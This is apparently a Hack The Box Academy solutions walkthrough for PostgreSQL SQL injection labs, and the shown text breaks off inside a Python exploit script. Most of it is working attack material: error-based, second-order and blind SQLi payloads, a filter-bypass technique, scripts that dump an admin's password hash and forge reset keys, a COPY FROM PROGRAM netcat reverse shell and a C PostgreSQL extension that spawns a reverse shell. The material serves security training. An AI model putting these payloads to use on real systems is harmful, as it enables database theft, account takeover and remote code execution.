Analyzing the endpoint, students will notice that it suffers from a from a SQLi as it concatenates the user-provided POST parameter `email` without any sanitization, given that it matches the `regex` pattern provided by the variable `p`. However, if any exception other than `EmptyResultDataAccessException` occurs, the stack trace is returned to the caller. Therefore, when sending the payload `' or 1=1@academy.htb`, `Exception var11` is raised due to the SQL query being ran contains HTML-encoded characters (which get auto converted by the framework):

![[HTB Solutions/CWEE/z. images/3f24f6281f8145498241b839a2ed78e0_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/00aeba3bff251535866c89419fd4c25c_MD5.jpg]]

Therefore, students need to exploit this `error-based SQL injection` by casting the `TEXT` result of the function `QUERY_TO_XML` as `INT`, passing the query that will exfiltrate the data of the user `potus4` to `QUERY_TO_XML` (students need to replace the single quotes around `potus4` with `$$` to avoid breaking the query):

Code: sql

```sql
email=';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM users WHERE username = $$potus4$$ ',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb
```

![[HTB Solutions/CWEE/z. images/b5da9d0ba1286f4668177c351ea40367_MD5.jpg]]

The query exfiltrates the data of the user `potus44` as:

- `id`: `10`
- `password`: `$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a`
- `email`: `james@usa.gov`

`id`, or, `var10000`, is now known. However, for `passwordResetHash`, students know from the analyzed source code that it is the hexadecimal representation of the MD5 hash of the attributes passed to `md5DigestAsHex`:

Code: java

```java
String passwordResetHash = DigestUtils.md5DigestAsHex(("" + var10000 + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());
```

Students can use Python to attain the hex representation of the hash, making sure to substitute `var10000` with `10`, `user.getEmail()` with `james@use.gov`, and `user.getPassword()` with `$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a`:

Code: python

```python
python3 -c 'import hashlib; print(hashlib.md5(("" + "10" + ":" + "james@usa.gov" + ":" + "$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a").encode("utf-8")).hexdigest())'
```

```
┌─[us-academy-1]─[10.10.15.70]─[htb-ac413848@htb-npmotne92n]─[~]
└──╼ [★]$ python3 -c 'import hashlib; print(hashlib.md5(("" + "10" + ":" + "james@usa.gov" + ":" + "$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a").encode("utf-8")).hexdigest())'

8eecaa80ca8f05273ecbe256e87e9c56
```

Now that `uid` and `passwordResetHash` are known, students can construct the link `https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56`.

Answer: `https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56`

# Second-Order SQL Injection

## Question 1

### "Exploit the second-order SQL injection in BlueBird on the target over port 8080. What is the password hash of 'betrayedApples3'?"

After spawning the target machine, students need to visit `http://STMIP:8080/signup` and create an account with dummy data:

![[HTB Solutions/CWEE/z. images/4a33cfddaf29f14c22fab7b0e4da3781_MD5.jpg]]

Students then need to click on the `Profile` button:

![[HTB Solutions/CWEE/z. images/6cc4685784ab1c5111d3c5f15051e0de_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/e4617fc0b943d387da6e338138b11e58_MD5.jpg]]

From the section's reading, students know that the GET `/profile/{id}` endpoint suffers from a `second-order SQL injection` as it concatenates the user's email without any sanitization, and that using `input tracing`, the POST `/profile/edit` endpoint can be used to update the value of `email`, effectively making it possible to pass a SQLi payload which will be subsequently used by the `/profile/{id}` endpoint unsafely:

![[HTB Solutions/CWEE/z. images/d5448eb354be387a84a2655251a65aab_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/3df4ee85e71829338d691e3c867d8851_MD5.jpg]]

To exploit the `second-order SQL injection`, students need to inject a `UNION` statement that exfiltrates the password of the user `betrayedApples3` into the `Email` field within the `/profile/edit` webpage, making sure to set the field's type to `text` instead of `email` to bypass the frontend's validation of the string passed:

Code: sql

```sql
' UNION SELECT '1','2','3',password,5 FROM users WHERE username='betrayedApples3'--
```

![[HTB Solutions/CWEE/z. images/6a3ec24f02d1cea9e2b3670fa65c5296_MD5.jpg]]

When visiting the profile page, students will attain the flag `$2b$12$V5XNBDjsjG9cbyYOB3Kmk.j36jEydVhXIegPpo4HTz7ehiodG1E8O`:

![[HTB Solutions/CWEE/z. images/933f302ce3fff654069f41a2eee3bee6_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/aff0fc628d091242e50b67886193f125_MD5.jpg]]

Answer: `$2b$12$V5XNBDjsjG9cbyYOB3Kmk.j36jEydVhXIegPpo4HTz7ehiodG1E8O`

# Reading and Writing Files

## Question 1

### "There is a SQL injection inside the signup functionality that we haven't explored yet. Use it to create the file /var/lib/postgresql/proof.txt on the target over port 8080 and then check /server-info for your flag."

After spawning the target machine, students need to download the directory `/opt/blurbird` from it using `scp` with the credentials `student:academy.hackthebox.com`, clone a mirror of [Fernflower](https://github.com/fesh0r/fernflower.git), install `openjdk-17-jdk` and set it as the default `JDK`, build `Fernflower` and use it to decompile `BlueBird-0.0.1-SNAPSHOT.jar`, extract all the source `.java` files, and then use `code` to analyze the source code:

Code: shell

```shell
scp -r student@STMIP:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac-413848@htb-bgt7wim7cy]─[~]
└──╼ [★]$ scp -r student@10.129.204.249:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/
The authenticity of host '10.129.204.249 (10.129.204.249)' can't be established.
ECDSA key fingerprint is SHA256:H3dchF69KY5+78o0pNtz2FCTJK5zJaExATyEcGhDhwA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.249' (ECDSA) to the list of known hosts.
student@10.129.204.249's password: 
BlueBird-0.0.1-SNAPSHOT.jar                                                                                                                                                      100%   45MB  19.2MB/s   00:02    
serverInfo.sh                                                                                                                                                                    100%  427    85.0KB/s   00:00    
postgresql-2023-03-10_133306.log                                                                                                                                                 100%  155KB   4.2MB/s   00:00    
postgresql-2023-03-22_144521.log                                                                                                                                                 100% 8124   227.2KB/s   00:00    
postgresql-2023-03-14_144813.log                                                                                                                                                 100% 9969   440.5KB/s   00:00    
postgresql-2023-03-15_051722.log                                                                                                                                                 100%   13KB 445.3KB/s   00:00    
Cloning into 'fernflower'...

<SNIP>
```

Analyzing the POST `/signup` endpoint that the question is referring to, students will notice that the first two queries cannot be abused for injection as they are parameterized queries (also known as `prepared statements`):

![[HTB Solutions/CWEE/z. images/347aa6b910ac2d1793d9f923545f3e59_MD5.jpg]]

However, for the third `INSERT` query, students will notice that the endpoint accepts the POST parameters `name`, `username`, `email`, and `password` from the sender of the request and directly concatenates them in the SQL query without sanitization:

![[HTB Solutions/CWEE/z. images/46f83efe8356481d64336ddcae7738d8_MD5.jpg]]

Therefore, students need to exploit this SQLi by first going `http://STMIP:8080/signup`:

![[HTB Solutions/CWEE/z. images/abf310e216ab54a9c28b52a8d37240c0_MD5.jpg]]

Then, to avoid breaking the `INSERT` statement and rendering the query invalid, students need to provide as `name` a SQLi payload that will close the `INSERT INTO` statement correctly with arbitrary values then end it with `);` to inject the SQL query afterwards. To write the file `/var/lib/postgresql/proof.txt`, the `COPY` method will be used, however, students can also use the `Large Objects` method:

Code: sql

```sql
Life', 'Short', 'Art@art.art', 'Long'); CREATE TABLE dbBackups(backup TEXT);INSERT INTO dbBackups VALUES('Life is short, art Long');COPY dbBackups TO '/var/lib/postgresql/proof.txt';DROP TABLE dbBackups; --
```

![[HTB Solutions/CWEE/z. images/3b7503e44a5b44e5c7fd7118603a9929_MD5.jpg]]

At last, after creating the account, students need to check `http://STMIP:8080/server-info` to attain the flag `HTB{8c03f71890a8919c84626cef49576e3f}`:

![[HTB Solutions/CWEE/z. images/778fe5f95533c312b647e81e25ea04e0_MD5.jpg]]

Answer: `HTB{8c03f71890a8919c84626cef49576e3f}`

# Command Execution

## Question 1

### "Use either technique in one of the many SQL injection vulnerabilities in BlueBird to get command execution on the server. As proof, what is the value of /var/lib/postgresql/13/main/flag.txt?"

After spawning the target machine, students can choose between the `COPY` or `PostgreSQL Extensions` methods to achieve RCE, the former will be used. Additionally, students can exploit any of the SQLi vulnerabilities discovered in the previous questions, the POST `/signup` endpoint will be exploited. First, students need to start a listener with `nc`:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.70]─[htb-ac413848@htb-86fotrbqub]─[~]
└──╼ [★]$ nc -nvlp 7331

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7331
Ncat: Listening on 0.0.0.0:7331
```

Subsequently, students need to write a [Netcat OpenBsd](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#netcat-openbsd) reverse-shell and then run it:

Code: sql

```sql
Life', 'Short', 'Art@art.art', 'Long'); CREATE TABLE dbBackups(backup TEXT); COPY dbBackups FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc PWNIP PWNPO >/tmp/f';SELECT * FROM dbBackups; DROP TABLE dbBackups; --
```

![[HTB Solutions/CWEE/z. images/448b1ae898c837d2cddf2ae6f5af77a0_MD5.jpg]]

When checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.152.182.
Ncat: Connection from 10.129.152.182:55642.
/bin/sh: 0: can't access tty; job control turned off
$ 
```

At last, students need to print out the contents of the file `/var/lib/postgresql/13/main/flag.txt`, to attain the flag `HTB{f9141e0c21d27c56cfdb812960d4e7c3}`:

Code: shell

```shell
cat /var/lib/postgresql/13/main/flag.txt
```

```
$ cat /var/lib/postgresql/13/main/flag.txt

HTB{f9141e0c21d27c56cfdb812960d4e7c3}
```

Answer: `HTB{f9141e0c21d27c56cfdb812960d4e7c3}`

# Skills Assessment

## Question 1

### "Identify and exploit the unauthenticated SQL injection to log in. What is the value of the flag on the dashboard?"

After spawning the target machine of any previous section (and not the one of the Skills Assessment section) except for `Introduction to PostgreSQL`, students need to download the file `/opt/Pass2-1.0.3-SNAPSHOT.jar` from it using `scp` with the credentials `student:academy.hackthebox.com`, clone a mirror of [Fernflower](https://github.com/fesh0r/fernflower.git), install `openjdk-17-jdk` and set it as the default `JDK`, build `Fernflower` and use it to decompile `Pass2-1.0.3-SNAPSHOT.jar`, extract all the source `.java` files, and then use `code` to analyze the source code:

Code: shell

```shell
scp -r student@STMIP:/opt/Pass2-1.0.3-SNAPSHOT.jar ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir Pass2SourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./Pass2-1.0.3-SNAPSHOT.jar Pass2SourceCode/
cd Pass2SourceCode/
jar -xf Pass2-1.0.3-SNAPSHOT.jar
code ./BOOT-INF/classes/
```

```
┌─[us-academy-1]─[10.10.15.7]─[htb-ac-413848@htb-ppokstoopp]─[~]
└──╼ [★]$ scp -r student@10.129.204.249:/opt/Pass2-1.0.3-SNAPSHOT.jar ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir Pass2SourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./Pass2-1.0.3-SNAPSHOT.jar Pass2SourceCode/
cd Pass2SourceCode/
jar -xf Pass2-1.0.3-SNAPSHOT.jar
code ./BOOT-INF/classes/

The authenticity of host '10.129.204.249 (10.129.204.249)' can't be established.
ECDSA key fingerprint is SHA256:H3dchF69KY5+78o0pNtz2FCTJK5zJaExATyEcGhDhwA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.249' (ECDSA) to the list of known hosts.
student@10.129.204.249's password: 
Pass2-1.0.3-SNAPSHOT.jar                                                                                                                                                         100%   45MB  20.3MB/s   00:02    
Cloning into 'fernflower'...
remote: Enumerating objects: 12680, done.
remote: Counting objects: 100% (3207/3207), done.
remote: Compressing objects: 100% (455/455), done.
remote: Total 12680 (delta 2910), reused 2752 (delta 2752), pack-reused 9473
Receiving objects: 100% (12680/12680), 6.19 MiB | 15.89 MiB/s, done.
Resolving deltas: 100% (7336/7336), done.
Reading package lists... Done
Building dependency tree... Done
```

![[HTB Solutions/CWEE/z. images/707d9c9bede5a77198ba3687556ae689_MD5.jpg]]

Students can use the techniques for searching for SQL queries as taught in the `Searching for Strings` section, however, the codebase is significantly small, thus, manual checking/reviewing suffices. The only two unauthenticated API endpoints/actions exist in the controllers `ApiController` and `ResetPasswordController` (in (some) web application development frameworks, "Controller" is appended after the controller's name as a convention that will allow users it invoke it without including the string "Controller"). In the latter, students will notice that there are two SQL queries, lines 29 and 61, however, both are parametrized queries and therefore cannot be exploited:

![[HTB Solutions/CWEE/z. images/83a1c91aa30f301f37ee53181985e776_MD5.jpg]]

Nevertheless, this controller exposes how passwords of users get reset, therefore, if it is possible to exfiltrate the password and email of any user, then, reseting their password also becomes possible:

![[HTB Solutions/CWEE/z. images/da9be99e1f1e67a8a5b546822d37549e_MD5.jpg]]

For the former controller `ApiController`, there is a GET endpoint/action (line 17) named `/api/vi/check-user` (line 18) which accepts a string parameter `u` (line 22) and concatenates it in the SQL query (line 25) after replacing a `regex` containing a list of SQL commands/keywords, white-space, `/**/`, and `--` with the empty string (line 24):

Code: java

```java
u = u.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
```

![[HTB Solutions/CWEE/z. images/f7e59bdf4c9de654de69c07f7b024b13_MD5.jpg]]

However, this protection put forward can be bypassed as the `regex` statement is [case-insensitive](https://www.regular-expressions.info/modifiers.html) for the SQL statements, e.g., instead of using `AND` or `and` (which are blacklisted), `And` can be used (therefore, `title case` need to be used for SQL commands). For whitespace (which is blacklisted), students need to utilize [PostgreSQL's multi-line comments](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-COMMENTS) as they will be evaluated by the query to whitespace, however, any character(s) must be between them as `/**/` is also blacklisted. At last, for inline comments `--`, students will notice that the `regex` only checks for them before the end of a line (given that `$` is used before `--`), therefore, bypassing it entails to providing any other character after it, such as `--/**/`. Students can use [regex101](https://regex101.com/r/jPkzEV/1) to test SQLi payloads before attempting to inject them in the web application, however, it is very important that students remove the escape character `\` before `\*` in `/\\*\\*/`, making it `/\*\*/`, otherwise, `/**/` will become whitelisted, rendering the payloads a failure as they will be replaced with the empty string:

Code: java

```java
|OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\*\*/|;|LENGTH|length|--$
```

Code: sql

```sql
'/*-*/And/*-*/(1=1)--/*-*/-
```

![[HTB Solutions/CWEE/z. images/1baac222cfed4c93db82428193810df2_MD5.jpg]]

Afterward, students need to visit the API endpoint `/api/v1/check-user` and provide the common username `admin` for the `u` parameter, getting back `true` for `exists`:

```
http://STMIP:8080/api/v1/check-user?u=admin
```

![[HTB Solutions/CWEE/z. images/2ecb22ee966facf43b6a08f17d3a3ad2_MD5.jpg]]

Since the username `admin` exists, students need to inject a query that if evaluated to `true`, the endpoint returns `true` (since `admin` exists (i.e., `true`) AND the injected query evaluates to `true`), otherwise, returns `false`. (This is a `boolean-based` `blind SQLi`, for more on blind SQLi, students are highly encouraged to take the `Blind SQL Injection` module.) Students can test the endpoint by injecting a query that will evaluate to `true`, attaining `true` for `exists`:

Code: sql

```sql
admin'/*-*/And/*-*/(1=1)--/*-*/-
```

![[HTB Solutions/CWEE/z. images/14fa244bd85d80f8ee7ed77d6765cb11_MD5.jpg]]

However, when injecting a query that will evaluate to `false`, students will attain `false` for `exists`:

Code: sql

```sql
admin'/*-*/And/*-*/(1=3)--/*-*/-
```

![[HTB Solutions/CWEE/z. images/7767de6f1bc2c37539edc58ce26647a3_MD5.jpg]]

Now, students need to automate the exfiltration of data by exploiting the blind SQLi. First, a simple query will be run to test the oracle:

Code: sql

```sql
1 = 1
```

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys
from urllib.parse import quote_plus

def oracle(query):
    existingUser = "admin"
    whitespace = "/*-*/"
    baseURL = f"http://STMIP:8080/api/v1/check-user?u={existingUser}"
    SQLiPayload = f''''{whitespace}And{whitespace}({query.replace(" ", whitespace)})--{whitespace}-'''
    response = requests.get(baseURL + quote_plus(SQLiPayload))
    jsonResponse = json.loads(response.text)
    return jsonResponse["exists"] == True

print(oracle("1 = 1"))
```

After running the script, students will attain `True`:

Code: shell

```shell
python3 poc.py
```

```
┌─[us-academy-1]─[10.10.14.86]─[htb-ac-413848@htb-atfp6z2ncm]─[~]
└──╼ [★]$ python3 poc.py

True
```

Using the same SQL-Anding technique taught in the `Optimizing` section of the `Blind SQL Injection` module, students need to slightly modify it to work with PostgreSQL's syntax to be able to exfiltrate data blindly:

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys
from urllib.parse import quote_plus

def oracle(query):
    existingUser = "admin"
    whitespace = "/*-*/"
    baseURL = f"http://STMIP:8080/api/v1/check-user?u={existingUser}"
    SQLiPayload = f''''{whitespace}And{whitespace}({query.replace(" ", whitespace)})--{whitespace}-'''
    response = requests.get(baseURL + quote_plus(SQLiPayload))
    jsonResponse = json.loads(response.text)
    return jsonResponse["exists"] == True

def dumpNumber(fieldToDump):
    length = 0
    for p in range(0, 7):
        if oracle(f"(Select Length({fieldToDump}) From users Where username = 'admin') & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(fieldToDump, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"(Select Ascii(Substring({fieldToDump},{i},1)) From users Where username = 'admin') & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string
```

To construct the "secretKey" required for reseting passwords as exposed by the POST `/reset-password` action of the controller `ResetPasswordController`, students need to exfiltrate the password and email of the user `admin`, starting with the former:

Code: python

```python
passwordLength = dumpNumber("passwoRd");
password = dumpString("passwoRd", passwordLength)
print(password)
```

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys
from urllib.parse import quote_plus

def oracle(query):
    existingUser = "admin"
    whitespace = "/*-*/"
    baseURL = f"http://STMIP:8080/api/v1/check-user?u={existingUser}"
    SQLiPayload = f''''{whitespace}And{whitespace}({query.replace(" ", whitespace)})--{whitespace}-'''
    response = requests.get(baseURL + quote_plus(SQLiPayload))
    jsonResponse = json.loads(response.text)
    return jsonResponse["exists"] == True

def dumpNumber(fieldToDump):
    length = 0
    for p in range(0, 7):
        if oracle(f"(Select Length({fieldToDump}) From users Where username = 'admin') & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(fieldToDump, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"(Select Ascii(Substring({fieldToDump},{i},1)) From users Where username = 'admin') & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

passwordLength = dumpNumber("passwoRd");
password = dumpString("passwoRd", passwordLength)
print(password)
```

After running the script, students will attain the password hash `$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG`:

Code: shell

```shell
python3 poc.py
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-mvfnzfbewn]─[~/Pass2SourceCode]
└──╼ [★]$ python3 poc.py

$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG
```

Subsequently, students need to exfiltrate the email of the user `admin`:

Code: python

```python
emailLength = dumpNumber("email");
email = dumpString("email", emailLength)
print(email)
```

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys
from urllib.parse import quote_plus

def oracle(query):
    existingUser = "admin"
    whitespace = "/*-*/"
    baseURL = f"http://STMIP:8080/api/v1/check-user?u={existingUser}"
    SQLiPayload = f''''{whitespace}And{whitespace}({query.replace(" ", whitespace)})--{whitespace}-'''
    response = requests.get(baseURL + quote_plus(SQLiPayload))
    jsonResponse = json.loads(response.text)
    return jsonResponse["exists"] == True

def dumpNumber(fieldToDump):
    length = 0
    for p in range(0, 7):
        if oracle(f"(Select Length({fieldToDump}) From users Where username = 'admin') & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(fieldToDump, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"(Select Ascii(Substring({fieldToDump},{i},1)) From users Where username = 'admin') & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

emailLength = dumpNumber("email");
email = dumpString("email", emailLength)
print(email)
```

After running the script, students will attain the email `admin@pass2.htb`:

Code: shell

```shell
python3 poc.py
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-mvfnzfbewn]─[~/Pass2SourceCode]
└──╼ [★]$ python3 poc.py

admin@pass2.htb
```

Now that students have both the password and email, they need to construct the "secretKey" to reset the `admin` password, based on the commands ran in the `calculateSecretKey` function within the controller `ResetPasswordController`:

Code: python

```python
import hashlib
import base64

tmp = "admin@pass2.htb" + "$4lty" + "$2a$12$QZzWJum2XkulScJtJDrZz.GFpVRjKgU.Sq7Ov1.mWYyn0W8YhIQgG"
encodedHash = hashlib.sha256(tmp.encode("utf-8")).digest()
b64 = base64.b64encode(encodedHash).decode().replace("-", "X").replace("_", "X").replace("=","")
secretKey = f"{b64[:4]}-{b64[4:8]}-{b64[8:12]}-{b64[12:16]}"
print(secretKey)
```

After running the script, students will attain the secret key `0NPd-748b-L2CD-MoR3`:

Code: shell

```shell
python3 constructSecretKey.py
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-mvfnzfbewn]─[~]
└──╼ [★]$ python3 constructSecretKey.py

0NPd-748b-L2CD-MoR3
```

Therefore, students now need to navigate to `http://STMIP:8080/reset-password` to reset the password of the admin:

![[HTB Solutions/CWEE/z. images/5d593051c38636672189b4a7b8e71347_MD5.jpg]]

It is always a good practice to use cryptographically secure passwords to disallow other threat agents from gaining access, to do so, students can use `openssl` to generate one:

Code: shell

```shell
openssl rand -hex 16
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-mvfnzfbewn]─[~/Pass2SourceCode]
└──╼ [★]$ openssl rand -hex 16

3b579698243a72bee5f08a37f245c3b1
```

Then, before on clicking `Reset Password`, students need to provide `admin` for the `username` field, `0NPd-748b-L2CD-MoR3` for the `Reset Key` field, and the `openssl` generated password for the `New Password` and `Repeat New Password` fields:

![[HTB Solutions/CWEE/z. images/f3ef5db5429ae5562b6487e339d8c454_MD5.jpg]]

Students will notice that the login form has been updated to include the message `Password was reset`, thus, they now need to login with the new credentials, attaining the flag `HTB{f69c870dbf86628cdf7e3ad1a58dbac1}`:

![[HTB Solutions/CWEE/z. images/cb75b0cf7261c50e828c3f345424eb14_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/57139c2c52ff205fa64fd464835e8930_MD5.jpg]]

Answer: `HTB{f69c870dbf86628cdf7e3ad1a58dbac1}`

# Skills Assessment

## Question 2

### "Identify and exploit the authenticated SQL injection to get command execution on the server. What is the value of the flag in /opt/Pass2/flag\_xxxxxxxx.txt?"

From the previous question, students have attained access the `dashboard` as the user `admin` and they now can update "passwords" that have an `id` (which is stored in a hidden element), `Title`, `Username`, and `Password`:

![[HTB Solutions/CWEE/z. images/6651fcbe7c8a34c12b5903818fb89eb7_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/77f87f7758e104648bed4305e4974589_MD5.jpg]]

When scrutinizing the controller `DashboardController`, especially the POST `/dashboard/edit` endpoint/action, students will notice that it takes the same attributes/parameters for "passwords", moreover, on line 57, the SQL query directly concatenates the value of `id` after replacing `'` with the empty string (which can be bypassed by using `$$` instead):

![[HTB Solutions/CWEE/z. images/c5d5961e1b452adbbfa5d90062da0850_MD5.jpg]]

Since the SQL query is not parametrized, students need to exploit it by first using `Burp Suite` to intercept the request sent when clicking on `Update` of any of the three passwords:

![[HTB Solutions/CWEE/z. images/94accb9e67cab7915a9ba359cf291e57_MD5.jpg]]

Then, when providing a second query after the keyword `And` that results to `true`, the result attained back in the response is `Password edited!`:

```
title=Hackthebox&username=quark55&password=9lF5%252%24juw%26L&id=1+And(1=1)--
```

![[HTB Solutions/CWEE/z. images/a3c2bec28141414b63de22592ef8fdc1_MD5.jpg]]

However, when providing a second query after the keyword `And` that results to `false`, the result attained back in the response is `You do not own this ID!`:

```
title=Hackthebox&username=quark55&password=9lF5%252%24juw%26L&id=1+And(1=3)--
```

![[HTB Solutions/CWEE/z. images/15058c772c5f0c65bd749ac168899717_MD5.jpg]]

Now that students have identified how to build the oracle for exploiting this blind SQLi, they need to utilize it to get remote code execution on the server. In this case, students do not have the option whether to use either the `COPY` or `PostgreSQL Extensions` methods, since the user running the queries in the backend does not posses the [pg\_execute\_server\_program](https://www.postgresql.org/docs/11/default-roles.html) role. Therefore, the `PostgreSQL Extensions` method must be used. First, students need to save the custom `C` extension for `PostgreSQL` that returns a reverse shell as the `postgres` provided in the `Command Execution` section of the module:

Code: c

```c
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>

#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;

PG_FUNCTION_INFO_V1(rev_shell);

Datum
rev_shell(PG_FUNCTION_ARGS)
{
    // Get arguments
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));
    int32 LPORT = PG_GETARG_INT32(1);

    // Define necessary struct
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LPORT); // LPORT
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr); // LHOST

    // Connect to target
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    int client_fd = connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    // Redirect STDOUT/IN/ERR to connection
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    // Start interactive /bin/sh
    execve("/bin/sh", NULL, NULL);

    PG_RETURN_INT32(0);
}
```

Then, students need to install `postgresql-server-dev-13` to be able to compile the extension:

Code: shell

```shell
sudo apt install postgresql-server-dev-13 -y
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-jexdps7n8s]─[~]
└──╼ [★]$ sudo apt install postgresql-server-dev-13 -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libgit2-1.1 libmbedcrypto3 libmbedtls12 libmbedx509-0 libstd-rust-1.48 libstd-rust-dev linux-kbuild-5.18 rust-gdb
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  libpq-dev libpq5 llvm-11 llvm-11-dev llvm-11-runtime llvm-11-tools
Suggested packages:
  postgresql-doc-13 llvm-11-doc
```

Subsequently, students need to use `gcc` to compile the extension to a `shared library object`:

Code: shell

```shell
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

```
┌─[us-academy-1]─[10.10.14.189]─[htb-ac-413848@htb-jexdps7n8s]─[~]
└──╼ [★]$ gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

Now that `pg_rev_shell.so` is created, students need to upload it to the web server by weaponizing the blind SQLi, as shown in the `Automation / Writing an Exploit` subsection of the `Command Exection` section of the module:

Code: python

```python
import requests
import random
import string
from urllib.parse import quote_plus
import math

BASE_URL = "http://STMIP:8080"
LHOST = "PWNIP"
LPORT = PWNPO
USERNAME = "admin"
PASSWORD = "3b579698243a72bee5f08a37f245c3b1" # Replace it with password used when reseting the password of the admin user

s = requests.Session()
r = s.post(
    f"{BASE_URL}/login",
    headers = {"Content-Type":"application/x-www-form-urlencoded"},
    data = f"username={USERNAME}&password={PASSWORD}"
)

if "My Passwords</h1>" in r.text:
    print("[*] Logged in")
else:
    print("Could not log in. Check the credentials!\nUse the same password when you reset it for the admin user.")
    exit(1)

def oracle(s, q):
    r = s.post(
        f"{BASE_URL}/dashboard/edit",
        headers = {"Content-Type":"application/x-www-form-urlencoded"},
        data = f"username={USERNAME}&password={PASSWORD}&title=Hackthebox&id={quote_plus(q)}"
